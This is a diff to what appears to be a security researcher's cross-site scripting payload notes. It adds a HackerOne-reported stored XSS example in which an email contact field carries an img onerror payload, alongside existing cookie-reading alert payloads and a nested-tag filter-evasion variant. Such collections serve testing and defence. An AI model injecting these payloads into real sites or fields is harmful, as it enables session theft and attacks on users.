@@ -86,5 +86,10 @@ attacker
         <script>alert(document.cookie)</script>
         <IMG src=1 onerror=alert(document.cookie)>
         <scr<script>ipt>alert(document.cookie)</script>
+ ## XSS from HACKERONE
+   * Stored email contact like below in general account settings 
+     It is stored xss
+     
+          luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com
     
  
